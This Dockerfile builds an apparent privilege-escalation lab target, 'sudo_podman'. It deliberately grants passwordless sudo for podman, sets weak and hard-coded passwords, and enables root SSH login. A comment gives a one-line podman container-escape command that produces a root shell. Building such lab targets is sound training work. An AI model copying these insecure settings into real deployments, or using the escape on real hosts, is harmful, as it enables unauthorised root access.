FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_podman
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/podman as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and podman
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        podman \
        fuse-overlayfs \
        slirp4netns \
        uidmap \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify podman is installed
RUN which podman && ls -la /usr/bin/podman

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# podman can run containers with full host access when run as root.
# The exploit approach:
#   sudo podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
# This mounts the entire host filesystem and chroots into it, giving a root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/podman" > /etc/sudoers.d/podman && \
    chmod 440 /etc/sudoers.d/podman

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Pre-pull alpine image so the exploit works without network access at runtime
# Use podman with appropriate storage settings for building in Docker
RUN podman --storage-driver=vfs pull docker.io/library/alpine:latest || true

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]